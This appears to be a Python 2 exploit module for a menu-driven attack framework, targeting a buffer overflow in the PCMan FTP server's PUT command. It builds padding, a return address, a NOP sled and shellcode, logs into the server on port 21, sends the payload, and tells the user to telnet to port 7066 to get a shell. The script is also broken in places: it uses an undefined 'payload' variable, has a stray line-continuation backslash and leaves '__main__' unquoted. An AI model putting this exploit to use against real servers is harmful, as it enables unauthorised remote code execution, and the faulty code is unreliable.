import os, sys
sys.path.append(os.path.join(os.path.dirname(__file__), '..', '..', '..'))
import core
class pcmanPutOverflowMenu(core.Exploit):
  def generate(self, p):
    p += self.rand(2017)
    p += "\x77\xc3\x54\x59"
    p += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    p += self.get_shellcode()
    print "[+]Payload generated."
    print "[*]Sending payload of size: " + str(len(payload.encode('utf-8')))
    s = socket(AF_INET, SOCK_STREAM)
    s.connect((self.host[0], 21))
    s.recv(1024)
    s.send("USER " + self.user[0])
    s.recv(1024)
    s.send("PASS " + self.passwd[0])
    s.recv(1024)
    s.send("PUT " + payload)\
    s.close()
    print "[+]Payload sent. Telnet to port 7066 on %s to get your shell. :)" % self.host[0]
def main():
  pcmanputoverflowmenu = pcmanPutOverflowMenu()
  pcmanputoverflowmenu.cmdloop("pdf-console attack(pcman_put_overflow)% ")
if __name__ == __main__:
  main()
